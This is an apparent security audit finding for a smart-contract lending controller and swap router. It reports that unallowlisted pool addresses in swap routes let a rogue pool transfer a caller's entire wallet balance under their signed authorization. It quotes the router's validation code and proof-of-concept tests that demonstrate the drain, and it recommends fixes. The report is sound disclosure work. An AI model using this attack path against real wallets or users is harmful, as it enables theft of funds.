### Title
Unallowlisted swap venues let a crafted route run attacker code inside the caller's authorization tree and drain wallet tokens — (File: contracts/controller/src/strategies/swap.rs)

### Summary
`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, `multiply` and the standalone router entrypoint `execute_strategy` accept an arbitrary `swap_xdr` payload whose instructions name pool/token addresses by index. Neither the controller nor the router enforces any allowlist on the venue/pool/token addresses a route can name. A malicious "pool" contract placed in a route hop is invoked below the caller's signed authorization entry, and any `token.transfer(caller, …)` it issues is recorded as a child of that entry — draining the caller's entire wallet of any token, not just the routed amount.

### Finding Description
In Chrome's CVE-2021-21205 the flaw was insufficient policy enforcement on navigation restrictions. The analog here is insufficient policy enforcement on the route's call graph:

- The controller strategies grant exactly one input-transfer authorization (`token_in.transfer(controller, router, amount_in)`) and afterwards check only measured input/output deltas and final account risk — INV-STRAT-01/02 in `docs/reference/invariants.md` (lines 632–660). There is no check on which contracts the route invokes.
- The router "keeps no allowlist" of pool/token addresses; its whitelist is only for fee placement — `docs/explanation/threat-model.md` lines 154–165 and `docs/reference/invariants.md` lines 671–672 (`INV-STRAT-03`). `program.rs::validate` checks opcodes, indices, `Prev` chains, and same-token swaps, but never restricts which pool or token address an instruction references [1](#0-0) .
- Consequently any address the payload names gets onto the call stack under the caller's auth subtree. A transfer that hop code makes from the caller "executes if the caller signs that tree," and simulation records it as a child of the caller's root entry — threat-model lines 155–160, proven by `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` [2](#0-1) .

### Impact Explanation
Theft of user funds beyond the routed amount. The test demonstrates a rogue pool moving the victim's full balance (77,770 units) of a token the protocol never listed, while the swap still settles correctly (the victim receives fair `token_out`, health checks pass, `swap_collateral` succeeds). Neither the payload `min_out`, the controller's `NoSwapOutput`/`RouterOverspend` measured-delta checks, nor the final risk gate bounds this loss — it is the caller's whole wallet [3](#0-2) .

### Likelihood Explanation
Any unprivileged user who signs a route built by a malicious/compromised quote source (or who hand-crafts routes for others to sign, e.g. via `flash_position` callback payloads or phishing a `execute_strategy` call) is exposed. Simulation's recording mode makes the poisoned child entry look like a legitimate part of the auth tree, so a wallet that presents it plainly or a user who doesn't decode the XDR signs the theft. The enforced-auth test confirms the transfer executes the moment the signed tree lists it [4](#0-3) .

### Recommendation
Enforce policy on the route's call surface rather than relying on client-side XDR decoding: maintain an allowlist of admitted venue/pool contracts (governance-managed, like the Blend migration approval list in `INV-STRAT-03`), or constrain hops to known venue adapter entrypoints whose pool addresses were attested at market/listing time. Alternatively, isolate the auth grant — e.g. route through a per-call ephemeral holding contract so the caller's auth subtree can never contain arbitrary token transfers.

### Proof of Concept
`tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` is a working PoC: `UnlistedPoolRouter::execute_strategy` invokes the payload-named `hop_pool` (`lines 39–47`); `RogueHopPool::swap` calls `token.transfer(victim, attacker, amount)` from inside the hop (`lines 62–71`). Test `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` shows simulation attaches the theft as a child of the caller's `swap_collateral` entry and Alice's wallet is emptied (`lines 195–227`); `enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer` shows signing the simulated tree executes the theft (`lines 258–269`).

### Citations

**File:** contracts/swap-aggregator/src/program.rs (L237-303)
```rust
    /// Validates every instruction's opcode, mode, and indices before execution begins,
    /// including the `Prev` chain, same-token swaps, and split-weight bounds.
    fn validate(&self, env: &Env, assets_len: u32, amounts_len: u32, weight_count: u32) {
        for i in 0..self.op_count {
            let record = self.raw(i);
            let Some(opcode) = Opcode::from_u8(record[field::OPCODE]) else {
                panic_with_error!(env, Error::InvalidRouteXdr);
            };
            let mode = Mode::from_u8(record[field::MODE]);
            let (idx_a, idx_b, idx_c) = (
                record[field::POOL] as u32,
                record[field::TOKEN_IN] as u32,
                record[field::TOKEN_OUT] as u32,
            );

            // `Prev` is a purely structural link: the predecessor must exist,
            // must have a single output, and that output must be this
            // instruction's input.
            if mode == Mode::Prev {
                if i == 0 {
                    panic_with_error!(env, Error::BrokenTokenChain);
                }
                let previous = self.raw(i - 1);
                let produced = match Opcode::from_u8(previous[field::OPCODE]) {
                    // A swap produces its `token_out`, a mint its share token.
                    Some(Opcode::Swap(_)) => previous[field::TOKEN_OUT],
                    Some(Opcode::Mint) => previous[field::TOKEN_IN],
                    // A burn releases every constituent at once.
                    _ => panic_with_error!(env, Error::BrokenTokenChain),
                };
                if idx_b != produced as u32 {
                    panic_with_error!(env, Error::BrokenTokenChain);
                }
            }
            match mode {
                Mode::Fixed(idx) if idx as u32 >= amounts_len => {
                    panic_with_error!(env, Error::InvalidRouteXdr)
                }
                Mode::Ppm(idx) if idx as u32 >= weight_count => {
                    panic_with_error!(env, Error::InvalidRouteXdr)
                }
                _ => {}
            }

            if idx_a >= assets_len || idx_b >= assets_len {
                panic_with_error!(env, Error::InvalidRouteXdr);
            }
            match opcode {
                Opcode::Swap(_) => {
                    if idx_c >= assets_len {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                    if idx_b == idx_c {
                        panic_with_error!(env, Error::SameToken);
                    }
                }
                // Liquidity legs spend the full vault balance, so only `Mode::All` is valid.
                Opcode::Burn | Opcode::Mint => {
                    if mode != Mode::All {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                    if idx_c >= amounts_len {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                }
            }
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-227)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L229-269)
```rust
#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```
